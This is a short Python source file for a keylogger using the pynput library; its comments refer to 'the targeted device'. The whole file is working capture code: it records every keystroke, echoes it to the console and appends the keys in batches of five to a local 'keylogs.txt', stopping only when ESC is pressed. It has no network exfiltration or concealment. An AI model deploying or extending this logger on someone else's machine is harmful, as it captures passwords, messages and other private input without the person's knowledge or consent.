import pynput
from pynput.keyboard import Key, Listener # Import pynut

count = 0 
keys = []


def when_pressing_key(key): # Function for when a key is pressed from user on the targeted device 
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 5:     # Function ensures that every 5 letters the user types are sent to the text file 
        count = 0
        write_to_file(keys)
        keys = []

def write_to_file(keys):
    with open("keylogs.txt", "a") as f: # Function that writes string of key pressed to text file after being released by user
        for key in keys:
            f.write(str(key))

def when_releasing_key(key): # Function that kills program when the user presses the "ESC" key
    if key == Key.esc:
        return False



with Listener(on_press=when_pressing_key, on_release=when_releasing_key) as listener:
    listener.join()
